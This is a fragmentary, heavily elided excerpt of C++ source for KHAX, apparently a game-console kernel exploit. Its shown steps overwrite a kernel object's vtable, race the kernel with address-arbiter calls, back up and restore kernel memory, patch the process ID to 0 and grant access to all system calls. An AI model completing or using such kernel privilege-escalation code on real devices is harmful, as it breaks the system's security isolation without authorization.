...
namespace KHAX
{
	...
	private:
		...
		static Result Step3f_RestoreKernelBackup();
		// Patch the process ID to 0.  Runs as svcBackdoor.
...
Result KHAX::MemChunkHax2::Step3_OverwriteVtable()
{
	...
	// Retrieve an address arbiter handle.
	...
	// Create a pointer to where the object's vtable will be mapped.
	...
	while(static_cast<u32>(svcArbitrateAddress(arbiter, m_mapAddr, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0)) == 0xD9001814);
	...
	while(static_cast<u32>(svcArbitrateAddress(arbiter, m_mapAddr + PAGE_SIZE, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0)) == 0xD9001814);
	...
	*vtablePtr = m_oldVtable;
	...
	svcBackdoor(Step3f_RestoreKernelBackup);
...
void KHAX::MemChunkHax2::Step3c_SVCEntryPointThunk()
{
	...
	// Back up a page of kernel memory before it is cleared.
	// FIXME: This is currently unable to execute on time. By the time this
	// FIXME: runs, at least some of kernel memory has usually been cleared.
	memcpy(s_instance->m_backup, reinterpret_cast<void*>(s_instance->m_kObjAddr), PAGE_SIZE);
...
{
	// Grant access to all SVC calls.
	if (Result result = Step3e_GrantSVCAccess())
	{
...
//------------------------------------------------------------------------------------------------
// Restore the backup of cleared kernel memory.
Result KHAX::MemChunkHax2::Step3f_RestoreKernelBackup()
{
	// Disable interrupts ASAP.
	// FIXME: Need a better solution for this.
	__asm__ volatile("cpsid aif");
	...
	// Restore the backup of cleared kernel memory.
	memcpy(reinterpret_cast<void*>(s_instance->m_kObjAddr), s_instance->m_backup, PAGE_SIZE);
